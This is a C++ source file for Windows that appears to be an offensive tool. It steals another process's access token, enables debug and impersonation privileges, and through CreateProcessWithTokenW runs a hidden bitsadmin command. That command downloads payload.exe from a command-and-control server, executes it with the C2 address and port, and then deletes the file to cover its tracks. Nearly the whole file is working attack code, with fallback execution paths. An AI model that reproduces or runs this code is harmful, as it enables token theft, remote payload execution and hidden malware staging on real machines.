#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <locale>
#include <codecvt>

// Set privilege function
BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid = { 0 };
    BOOL res = TRUE;

    if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
    printf(res ? "[+] Successfully enabled %s\n" : "[-] Failed to enable %s\n", priv);
    return res;
}

// Get access token function
HANDLE getToken(DWORD pid) {
    HANDLE cToken = NULL;
    HANDLE ph = NULL;
    if (pid == 0) {
        ph = GetCurrentProcess();
    }
    else {
        ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
    }
    if (!ph) cToken = (HANDLE)NULL;
    printf(ph ? "[+] Successfully got process handle\n" : "[-] Failed to get process handle\n");
    BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
    if (!res) cToken = (HANDLE)NULL;
    printf((cToken != (HANDLE)NULL) ? "[+] Successfully got access token\n" : "[-] Failed to get access token\n");
    return cToken;
}

// Download and execute payload using bitsadmin
BOOL downloadAndExecute(HANDLE token, LPCWSTR c2Server, int c2Port, int httpPort = 8080) {
    HANDLE dToken = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL res = TRUE;

    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESTDHANDLES;

    // Create C:\temp if it doesn't exist
    WCHAR tempDir[] = L"C:\\temp";
    CreateDirectoryW(tempDir, NULL);

    // Set download path
    WCHAR downloadPath[MAX_PATH] = L"C:\\temp\\payload.exe";

    // Command to download and execute payload using bitsadmin
    WCHAR cmdLine[1024];
    swprintf_s(cmdLine,
        L"cmd.exe /c bitsadmin /transfer myjob /download /priority normal http://%s:%d/payload.exe \"%s\" && \"%s\" %s %d",
        c2Server, httpPort, downloadPath, downloadPath, c2Server, c2Port);

    printf("[*] Executing: %S\n", cmdLine);

    res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
    printf(res ? "[+] Successfully duplicated token\n" : "[-] Failed to duplicate token\n");

    if (res) {
        res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, NULL, cmdLine,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        if (!res) {
            DWORD lastError = GetLastError();
            printf("[-] Initial execution failed (Error: %d). Trying fallback...\n", lastError);

            // Fallback 1: Try just running the payload if it exists
            swprintf_s(cmdLine, L"cmd.exe /c \"%s\" %s %d", downloadPath, c2Server, c2Port);
            res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, NULL, cmdLine,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

            if (!res) {
                // Fallback 2: Try downloading then executing as separate commands
                swprintf_s(cmdLine, L"cmd.exe /c bitsadmin /transfer myjob /download /priority normal http://%s:%d/payload.exe \"%s\"",
                    c2Server, httpPort, downloadPath);
                res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, NULL, cmdLine,
                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

                if (res) {
                    // Wait for download to complete
                    WaitForSingleObject(pi.hProcess, INFINITE);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);

                    // Now execute the payload
                    swprintf_s(cmdLine, L"cmd.exe /c \"%s\" %s %d", downloadPath, c2Server, c2Port);
                    res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, NULL, cmdLine,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                }
            }
        }

        if (res) {
            printf("[+] Payload executed successfully\n");

            // Cleanup - delete the payload
            WCHAR cleanupCmd[MAX_PATH + 20];
            swprintf_s(cleanupCmd, L"cmd.exe /c del \"%s\"", downloadPath);

            PROCESS_INFORMATION cleanupPi;
            ZeroMemory(&cleanupPi, sizeof(PROCESS_INFORMATION));

            if (CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, NULL, cleanupCmd,
                CREATE_NO_WINDOW, NULL, NULL, &si, &cleanupPi)) {
                WaitForSingleObject(cleanupPi.hProcess, INFINITE);
                CloseHandle(cleanupPi.hProcess);
                CloseHandle(cleanupPi.hThread);
                printf("[+] Payload cleanup completed\n");
            }
            else {
                printf("[-] Failed to cleanup payload (Error: %d)\n", GetLastError());
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            printf("[-] All execution attempts failed\n");
        }

        CloseHandle(dToken);
    }

    return res;
}

int main(int argc, char** argv) {
    if (argc < 4) {
        printf("Usage: %s <pid> <c2_server> <c2_port> [http_port=8080]\n", argv[0]);
        printf("Example: %s 1234 192.168.1.100 4444 8080\n", argv[0]);
        return -1;
    }

    // Set required privileges
    if (!setPrivilege(SE_DEBUG_NAME) || !setPrivilege(SE_IMPERSONATE_NAME)) {
        return -1;
    }

    DWORD pid = atoi(argv[1]);
    int c2Port = atoi(argv[3]);
    int httpPort = (argc > 4) ? atoi(argv[4]) : 8080;

    // Convert char* to LPCWSTR
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::wstring c2ServerW = converter.from_bytes(argv[2]);
    LPCWSTR c2Server = c2ServerW.c_str();

    HANDLE cToken = getToken(pid);
    if (!downloadAndExecute(cToken, c2Server, c2Port, httpPort)) {
        return -1;
    }

    return 0;
}
